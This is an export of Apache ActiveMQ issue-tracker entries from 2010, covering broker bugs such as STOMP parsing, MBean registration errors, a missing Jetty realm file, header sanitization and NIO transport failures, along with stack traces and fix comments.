","apache camel, grails 1.3.2 - server is spring 2.5.6. activemq-all-5.3.0.jar activemq-pool5.3-SNAPSHOT.jar",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74782,,,Tue Jul 27 12:56:51 UTC 2010,,,,,,,,,,,"0|i0tswn:",171992,,,,,,,,,,,,,,,,,,,,,"15/Jul/10 12:59;gtully;what about: failover:(tcp://localhost:61616)?jms.useCompression=true ?;;;","15/Jul/10 13:02;jrobens;Gary - yes tried that too.;;;","15/Jul/10 13:30;gtully;Can u validate against a trunk (5.4-SNAPSHOT) see the reference to the test in https://issues.apache.org/activemq/browse/AMQ-2823?focusedCommentId=60611&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#action_60611;;;","27/Jul/10 12:56;jrobens;Gary 

Sorry - you are correct. The syntax outside the brackets works.

Thanks

John;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stomp+nio transport fails sending byte messages with NULL chars,AMQ-2822,12482728,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,12/Jul/10 09:51,12/Jul/10 13:58,14/Jul/23 05:43,12/Jul/10 13:58,5.3.0,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"The problem is that routine for parsing commands doesn't take Content-length header into account, but only searches for the next NULL character.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74784,,,Mon Jul 12 13:58:22 UTC 2010,,,,,,,,,,,"0|i0rq8v:",159896,,,,,,,,,,,,,,,,,,,,,"12/Jul/10 13:58;dejanb;Fixed with svn revision 963282;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
javax.management.InstanceAlreadyExistsException when registrating an MBean,AMQ-2819,12482556,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,christian.lang,christian.lang,09/Jul/10 13:00,11/Aug/11 19:15,14/Jul/23 05:43,11/Aug/11 19:15,5.3.2,,,,,,,,Broker,,,,0,,,,,,,,,"Hi,

I'm using the latest ActiveMQ version in a test environment with about 100 msg / sec via stomp.
From time to time, i receive the following warning in the logfile:

INFO   | jvm 1    | 2010/07/09 14:38:11 |  WARN | Failed to register MBean: org.apache.activemq:BrokerName=localhost,Type=Connection,ConnectorName=stomp+nio,ViewType=address,Name=/XXXXXXXX

Furthermore, this mbean seems to hang as it always appears in the jetty ""Connections"" frontend as ""active connection"".

After some debugging i found following exception in the logfile:

2010-07-09 13:20:58,036 | DEBUG | Setting up new connection id: ID:XXXXXXXX:1995214, address: /XXXXXXXX:56801 | org.apache.activemq.broker.TransportConnection | ActiveMQ NIO Worker
2010-07-09 13:20:58,038 | DEBUG | localhost removing consumer: ID:XXXXXXXX:239638 for destination: queue://myqueue | org.apache.activemq.broker.region.AbstractRegion | ActiveMQ Transport: tcp:///XXXXXXXX:54632
2010-07-09 13:20:58,038 | DEBUG | remove sub: QueueSubscription: consumer=ID:XXXXXXXX:1:239638, destinations=1, dispatched=0, delivered=0, pending=0, lastDeliveredSeqId: 0, dequeues: 208844, dispatched: 208883, inflight: 0 | org.apache.activemq.broker.region.Queue | ActiveMQ Transport: tcp:///XXXXXXXX:54632
2010-07-09 13:20:58,038 | DEBUG | localhost adding consumer: ID:XXXXXXXX:239639 for destination: queue://myqueue | org.apache.activemq.broker.region.AbstractRegion | ActiveMQ Transport: tcp:///XXXXXXXX:54632
2010-07-09 13:20:58,039 | DEBUG | Transport failed: java.io.IOException: Broken pipe | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ NIO Worker
java.io.IOException: Broken pipe
 at sun.nio.ch.FileDispatcher.write0(Native Method)
 at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:29)
 at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:104)
 at sun.nio.ch.IOUtil.write(IOUtil.java:75)
 at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:334)
 at org.apache.activemq.transport.nio.NIOOutputStream.write(NIOOutputStream.java:174)
 at org.apache.activemq.transport.nio.NIOOutputStream.flush(NIOOutputStream.java:115)
 at java.io.DataOutputStream.flush(DataOutputStream.java:106)
 at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:168)
 at org.apache.activemq.transport.stomp.StompTransportFilter.sendToStomp(StompTransportFilter.java:92)
 at org.apache.activemq.transport.stomp.ProtocolConverter.sendToStomp(ProtocolConverter.java:139)
 at org.apache.activemq.transport.stomp.ProtocolConverter.handleException(ProtocolConverter.java:221)
 at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:195)
 at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:71)
 at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
 at org.apache.activemq.transport.stomp.StompNIOTransport.serviceRead(StompNIOTransport.java:122)
 at org.apache.activemq.transport.stomp.StompNIOTransport.access$000(StompNIOTransport.java:49)
 at org.apache.activemq.transport.stomp.StompNIOTransport$1.onSelect(StompNIOTransport.java:73)
 at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94)
 at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119)
 at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
 at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
 at java.lang.Thread.run(Thread.java:619)
2010-07-09 13:20:58,040 | DEBUG | Stopping connection: /XXXXXXXX:56801 | org.apache.activemq.broker.TransportConnection | ActiveMQ Task
2010-07-09 13:20:58,040 | DEBUG | Stopping transport tcp:///XXXXXXXX:56801 | org.apache.activemq.transport.tcp.TcpTransport | ActiveMQ Task
2010-07-09 13:20:58,040 | DEBUG | Stopped transport: null | org.apache.activemq.broker.TransportConnection | ActiveMQ Task
2010-07-09 13:20:58,040 | DEBUG | Cleaning up connection resources: null | org.apache.activemq.broker.TransportConnection | ActiveMQ Task
2010-07-09 13:20:58,040 | DEBUG | remove connection id: ID:XXXXXXXX:1995214 | org.apache.activemq.broker.TransportConnection | ActiveMQ Task
2010-07-09 13:20:58,040 | DEBUG | Connection Stopped: null | org.apache.activemq.broker.TransportConnection | ActiveMQ Task
2010-07-09 13:20:58,158 | WARN  | Failed to register MBean: org.apache.activemq:BrokerName=localhost,Type=Connection,ConnectorName=stomp+nio,ViewType=address,Name=/XXXXXXXX_56802 | org.apache.activemq.broker.jmx.ManagedTransportConnection | ActiveMQ Task
2010-07-09 13:20:58,158 | DEBUG | Failure reason: javax.management.InstanceAlreadyExistsException: org.apache.activemq:BrokerName=localhost,Type=Connection,ConnectorName=stomp+nio,ViewType=address,Name=/XXXXXXXX_56802 | org.apache.activemq.broker.jmx.ManagedTransportConnection | ActiveMQ Task
javax.management.InstanceAlreadyExistsException: org.apache.activemq:BrokerName=localhost,Type=Connection,ConnectorName=stomp+nio,ViewType=address,Name=/XXXXXXXX_56802
 at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:453)
 at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.internal_addObject(DefaultMBeanServerInterceptor.java:1484)
 at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:963)
 at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:917)
 at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:312)
 at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:482)
 at org.apache.activemq.broker.jmx.ManagementContext.registerMBean(ManagementContext.java:305)
 at org.apache.activemq.broker.jmx.AnnotatedMBean.registerMBean(AnnotatedMBean.java:54)
 at org.apache.activemq.broker.jmx.ManagedTransportConnection.registerMBean(ManagedTransportConnection.java:99)
 at org.apache.activemq.broker.jmx.ManagedTransportConnection.<init>(ManagedTransportConnection.java:57)
 at org.apache.activemq.broker.jmx.ManagedTransportConnector.createConnection(ManagedTransportConnector.java:52)
 at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:212)
 at java.lang.Thread.run(Thread.java:619)
2010-07-09 13:20:58,159 | DEBUG | Setting up new connection id: ID:XXXXXXXX:1995215, address: /XXXXXXXX:56802 | org.apache.activemq.broker.TransportConnection | ActiveMQ NIO Worker

As you can see, the instance of this MBean seems to be already registered.

Any idea why this happens and how to fix?

Cheers,
Christian



",Debian x64,lionel.cons,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3392,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,65334,,,Thu Aug 11 19:15:58 UTC 2011,,,,,,,,,,,"0|i0tsnj:",171951,,,,,,,,,,,,,,,,,,,,,"05/Jul/11 15:31;gtully;seems to be the same issue. Tonight's 5.6-SNAPSHOT will have the fix. ;;;","11/Aug/11 19:15;tabish;Fixed by AMQ-3382;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
jetty-realm.properties is not found when starting ActiveMQ in console mode on OSX,AMQ-2818,12482802,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,alexdean,alexdean,08/Jul/10 16:46,09/Jul/10 13:30,14/Jul/23 05:43,09/Jul/10 13:30,,,,,,5.4.0,,,,,,,0,,,,,,,,,"/usr/local/apache-activemq-5.4-SNAPSHOT$ bin/macosx/activemq console
Running ActiveMQ Broker...
wrapper  | --> Wrapper Started as Console
wrapper  | Launching a JVM...
jvm 1    | Wrapper (Version 3.2.3) http://wrapper.tanukisoftware.org
jvm 1    |   Copyright 1999-2006 Tanuki Software, Inc.  All Rights Reserved.
jvm 1    | 
jvm 1    | Java Runtime: Apple Inc. 1.5.0_22 /System/Library/Frameworks/JavaVM.framework/Versions/1.5.0/Home
jvm 1    |   Heap sizes: current=1984k  free=1059k  max=520256k
jvm 1    |     JVM args: -Dactivemq.home=../.. -Dactivemq.base=../.. -Djavax.net.ssl.keyStorePassword=password -Djavax.net.ssl.trustStorePassword=password -Djavax.net.ssl.keyStore=../../conf/broker.ks -Djavax.net.ssl.trustStore=../../conf/broker.ts -Dcom.sun.management.jmxremote -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Xmx512m -Djava.library.path=../../bin/macosx/ -Dwrapper.key=tfJDUsBO_GwymN0M -Dwrapper.port=32000 -Dwrapper.jvm.port.min=31000 -Dwrapper.jvm.port.max=31999 -Dwrapper.pid=44040 -Dwrapper.version=3.2.3 -Dwrapper.native_library=wrapper -Dwrapper.cpu.timeout=10 -Dwrapper.jvmid=1
jvm 1    | ACTIVEMQ_HOME: ../..
jvm 1    | ACTIVEMQ_BASE: ../..
jvm 1    | Loading message broker from: xbean:activemq.xml
jvm 1    |  INFO | PListStore:../../data/localhost/tmp_storage started
jvm 1    |  INFO | Using Persistence Adapter: KahaDBPersistenceAdapter[../../data/kahadb]
jvm 1    |  INFO | Recoverying from the journal ...
jvm 1    |  INFO | Recovery replayed 1 operations from the journal in 0.0070 seconds.
jvm 1    |  INFO | ActiveMQ 5.4-SNAPSHOT JMS Message Broker (localhost) is starting
jvm 1    |  INFO | For help or more information please see: http://activemq.apache.org/
jvm 1    |  INFO | Scheduler using directory: activemq-data/scheduler
jvm 1    |  INFO | Listening for connections at: tcp://rutabaga.local:61616
jvm 1    |  INFO | Connector openwire Started
jvm 1    |  INFO | ActiveMQ JMS Message Broker (localhost, ID:rutabaga.local-55820-1278607585105-0:0) started
jvm 1    |  INFO | Logging to org.slf4j.impl.JCLLoggerAdapter(org.eclipse.jetty.util.log) via org.eclipse.jetty.util.log.Slf4jLog
jvm 1    |  INFO | jetty-7.0.1.v20091125
jvm 1    |  WARN | FAILED HashLoginService[ActiveMQRealm]: java.io.FileNotFoundException: /usr/local/apache-activemq-5.4-SNAPSHOT/bin/macosx/jetty-realm.properties (No such file or directory)
jvm 1    |  WARN | FAILED ConstraintSecurityHandler@7fbe19: java.io.FileNotFoundException: /usr/local/apache-activemq-5.4-SNAPSHOT/bin/macosx/jetty-realm.properties (No such file or directory)
jvm 1    |  WARN | FAILED HandlerCollection@996f0e: java.io.FileNotFoundException: /usr/local/apache-activemq-5.4-SNAPSHOT/bin/macosx/jetty-realm.properties (No such file or directory)
jvm 1    |  WARN | Error starting handlers
jvm 1    | java.io.FileNotFoundException: /usr/local/apache-activemq-5.4-SNAPSHOT/bin/macosx/jetty-realm.properties (No such file or directory)
jvm 1    | 	at java.io.FileInputStream.open(Native Method)
jvm 1    | 	at java.io.FileInputStream.<init>(FileInputStream.java:106)
jvm 1    | 	at org.eclipse.jetty.util.resource.FileResource.getInputStream(FileResource.java:274)
jvm 1    | 	at org.eclipse.jetty.security.HashLoginService.loadUsers(HashLoginService.java:145)
jvm 1    | 	at org.eclipse.jetty.security.MappedLoginService.doStart(MappedLoginService.java:115)
jvm 1    | 	at org.eclipse.jetty.security.HashLoginService.doStart(HashLoginService.java:186)
jvm 1    | 	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
jvm 1    | 	at org.eclipse.jetty.security.SecurityHandler.doStart(SecurityHandler.java:316)
jvm 1    | 	at org.eclipse.jetty.security.ConstraintSecurityHandler.doStart(ConstraintSecurityHandler.java:231)
jvm 1    | 	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
jvm 1    | 	at org.eclipse.jetty.server.handler.HandlerCollection.doStart(HandlerCollection.java:165)
jvm 1    | 	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
jvm 1    | 	at org.eclipse.jetty.server.handler.HandlerWrapper.doStart(HandlerWrapper.java:92)
jvm 1    | 	at org.eclipse.jetty.server.Server.doStart(Server.java:228)
jvm 1    | 	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:592)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:592)
jvm 1    | 	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
jvm 1    | 	at org.apache.activemq.console.Main.main(Main.java:107)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:592)
jvm 1    | 	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
jvm 1    | 	at java.lang.Thread.run(Thread.java:613)
jvm 1    |  INFO | Started SelectChannelConnector@0.0.0.0:8161

","OSX 10.5.6
Apple MacBook Pro
java version ""1.5.0_22""
Java(TM) 2 Runtime Environment, Standard Edition (build 1.5.0_22-b03-333-9M3125)
Java HotSpot(TM) Client VM (build 1.5.0_22-147, mixed mode, sharing)
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74785,,,Fri Jul 09 13:30:38 UTC 2010,,,,,,,,,,,"0|i0rr2n:",160030,,,,,,,,,,,,,,,,,,,,,"09/Jul/10 13:30;dejanb;Fixed with svn revision 962519.

Incidentally I renamed bin/activemq fgstart task to console;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
STOMP headers need sanitization,AMQ-2817,12482812,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,jamesc,jamesc,08/Jul/10 15:30,09/Jul/10 12:56,14/Jul/23 05:43,09/Jul/10 12:56,5.3.2,,,,,5.4.0,,,Transport,,,,0,,,,,,,,,"Currently STOMP on a SEND extracts out the JMS headers and put the rest of the headers into the message properties.  If a STOMP consumer starts to consume the messages, the JMS fields are put into the header and the the properties are put in.  This can lead to a situation where if the client has provided a header that it shouldn't have (e.g. message-id) it overwrites the one provided by the broker.

This can lead to problems with e.g. ACKs where the wrong message-id is sent back.

This patch sanitizes all headers for a MESSAGE frame when they come into the broker so they never get set in the properties.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jul/10 15:33;jamesc;headers.patch;https://issues.apache.org/jira/secure/attachment/12461756/headers.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74786,,,Fri Jul 09 12:56:57 UTC 2010,,,,,,,Patch Available,,,,"0|i0rr2f:",160029,,,,,,,,,,,,,,,,,,,,,"08/Jul/10 15:33;jamesc;Patch against trunk to clean up the header along with a unit test;;;","09/Jul/10 12:56;dejanb;Patch applied (svn revision 962512) with thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BrokerService @PostConstruct invalidates XBeanBrokerService w/ start=false,AMQ-2813,12483489,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,dnawrocki,dnawrocki,07/Jul/10 17:16,06/Sep/10 09:39,14/Jul/23 05:43,06/Sep/10 09:39,5.3.1,,,,,5.4.1,,,Broker,,,,0,,,,,,,,,"- XBeanBrokerService#afterPropertiesSet() method checks the start flag and is annotated as @PostConstruct so it's called at startup
- BrokerService#start() method has the @PostConstruct annotation as well
- There is no way for the BrokerService class to check the 'start' flag in the XBeanBrokerService subclass.
- Spring will call BOTH @PostConstruct methods resulting in the broker being started regardless of the xbean start flag

According to Gary Tully:

That looks like a bug that was introduced in
http://svn.apache.org/viewvc?rev=908182&view=rev the postConstruct on
the start method does invalidate the
XBeanBrokerService#afterPropertiesSet()  smarts. 

As discussed in:

http://old.nabble.com/XBean-%27start%3Dfalse%27-not-working--td29086727.html
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2601,,,,,,,,,,"03/Sep/10 15:23;dnawrocki;broker_startup_fix.patch;https://issues.apache.org/jira/secure/attachment/12461802/broker_startup_fix.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14823,,,Mon Sep 06 09:39:22 UTC 2010,,,,,,,,,,,"0|i0ba4f:",63752,Regression,,,,,,,,,,,,,,,,,,,,"06/Aug/10 16:04;dejanb;It seems that this works fine on the trunk. I just committed two tests that shows it works properly for both plain Spring and XBean.

If you still see the problem, please reopen it and attach the test case.;;;","01/Sep/10 17:21;dnawrocki;Still doesn't work as of AMQ 5.4.0.

Let me explain what I'm trying to do:
1) Shared file system master-slave using nfsv4
2) Broker instantiated by Spring

The 1st AS will come up OK, but the 2nd (3rd, 4th, etc) AS will block indefinitely at org.apache.activemq.store.kahadb.MessageDatabase.lock(MessageDatabase.java:329).  Spring is calling the @PostConstruct method on BrokerService, which doesn't (cannot) check the XBeanBrokerService's 'start' flag.

Removal of the @PostConstruct annotation on BrokerService#start fixed the issue for 5.3.2, I haven't verified on 5.4.0.;;;","01/Sep/10 20:44;dnawrocki;I can confirm that removing the @PostConstruct annotation work w/ 5.4.0 as well.

I should also mention that the reason I am having so much trouble with this is because I am running my webapp under JBoss.  When JBoss attempts to deploy my EAR file, the ""main"" thread ends up calling BrokerService#start.  Because the ""main"" thread is not blocked indefinitely, JBoss is left in an inconsistent state and will never serve ANY http requests, and will not respond to a kill command.  I have to kill -9 the java process to get it to terminate.;;;","02/Sep/10 08:18;dejanb;So should we resolve this issue again?;;;","03/Sep/10 15:23;dnawrocki;Attached is a patch (generated with svn diff) that fixes it for my use case.  I don't think it will have any unintended consequences for users instantiating a BrokerService and not using the XBeanBrokerService.  If this makes it into 5.4.1 I'd be happy to close this issue.;;;","06/Sep/10 09:39;dejanb;Patch applied with svn revision 992984. Thanks Dan.

The problem this missed in our tests was, because XBean+Spring combination doesn't call @PostConstruct on parent objects as it is done in EJB environment you're using.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Network of Brokers: NIO-Transport: Members die after some hours,AMQ-2811,12482764,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,dialsc,dialsc,06/Jul/10 13:26,15/Jul/10 10:19,14/Jul/23 05:43,15/Jul/10 10:19,5.3.1,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"i have a network of brokers configured with four nodes where each node knows the other three nodes through the networkConnector config. two of these four nodes are currently down/unavailable. the other two nodes are working for about four hours then they die. in the log file i see a lot of entries like this one:

2010-07-05 00:53:01,741 | ERROR | Could not stop service: tcp://null:0. Reason: java.lang.NullPointerException | org.apache.activemq.transport.nio.NIOTransport | Simple Discovery Agent: java.util.concurrent.ThreadPoolExecutor$Worker@f782b1
java.lang.NullPointerException
        at org.apache.activemq.transport.nio.NIOTransport.doStop(NIOTransport.java:152)
        at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:69)
        at org.apache.activemq.transport.tcp.TcpTransport.stop(TcpTransport.java:500)
        at org.apache.activemq.transport.InactivityMonitor.stop(InactivityMonitor.java:121)
        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64)
        at org.apache.activemq.transport.WireFormatNegotiator.stop(WireFormatNegotiator.java:91)
        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64)
        at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64)
        at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132)
        at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:43)
        at org.apache.activemq.network.DiscoveryNetworkConnector.onServiceAdd(DiscoveryNetworkConnector.java:134)
        at org.apache.activemq.transport.discovery.simple.SimpleDiscoveryAgent$1.run(SimpleDiscoveryAgent.java:164)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619 ","RedHat Linux, Java 1.6",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74789,,,Thu Jul 15 10:19:16 UTC 2010,,,,,,,,,,,"0|i0rqs7:",159983,,,,,,,,,,,,,,,,,,,,,"15/Jul/10 10:19;gtully;fix for NPE in r964367;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
